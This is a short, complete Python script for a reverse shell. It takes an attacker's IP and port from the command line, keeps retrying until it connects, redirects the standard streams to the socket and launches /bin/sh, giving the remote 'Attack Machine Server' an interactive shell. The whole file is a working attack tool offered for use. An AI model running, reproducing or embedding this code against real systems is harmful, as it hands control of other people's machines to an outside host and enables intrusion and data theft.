#!/usr/bin/python3

import argparse
import os
import socket
import subprocess
import time

# Create CLI interface with arguments
parser = argparse.ArgumentParser(description="""Simple Reverse Shell script in
        Python that tries indefinitely to connect to a remote machine.""")

parser.add_argument('ip', metavar='IP',
                    help='IPv4 address of the remote machine')
parser.add_argument('port', metavar='PORT',
                    help='Port of the remote machine')

# Parse arguments
args = parser.parse_args()

# IP Address and Port of remote Attack Machine Server
IP = args.ip 
PORT = args.port 

# Convert Port to int
try:
    PORT = int(PORT)
except ValueError:
    print('{}: Invalid port "{}"'.format(__file__, PORT))
    exit(1)

# Create a Network Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connected = False

# Try to connect or reconnect to remote Machine
while not connected:
    try:
        print('Attempting to connect to remote server [{}] {}'.format(IP, PORT))
        s.connect((IP, PORT))
        connected = True
        print('Connected successfully to [{}] {}'.format(IP, PORT))
    except socket.error:
        print('Connection failed')
        time.sleep(2)

# Duplicate socket's file descriptor to standard streams.
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Send reverse shell
p = subprocess.call(['/bin/sh'])
